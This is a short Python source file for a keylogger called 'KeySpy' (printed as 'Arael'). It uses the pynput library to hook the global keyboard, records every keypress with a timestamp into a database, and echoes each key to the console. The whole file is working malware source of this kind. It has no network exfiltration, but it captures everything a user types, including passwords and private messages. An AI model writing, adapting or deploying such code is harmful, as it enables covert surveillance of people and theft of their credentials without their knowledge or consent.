from pynput import keyboard
from datetime import datetime
from src.db import init_db, SessionLocal
from src.models import Keystroke
import os
import threading

class KeySpy:
    def __init__(self, path=None):
        init_db()
        self.db = SessionLocal()

    def _write_log(self, key_str):
        now = datetime.now()
        timestamp = now.strftime("%H:%M:%S")
        ks = Keystroke(timestamp=now, key=key_str)
        self.db.add(ks)
        self.db.commit()

        print(f"[{timestamp}] {key_str}")


    def _on_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = f"<{key.name}>"
        self._write_log(key_str)

    def start(self):
        listener = keyboard.Listener(on_press=self._on_press)
        listener.start()
        print("Arael is listening...")
        listener.join()


if __name__ == "__main__":
    keylogger = KeySpy()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("\nArael stopped.")
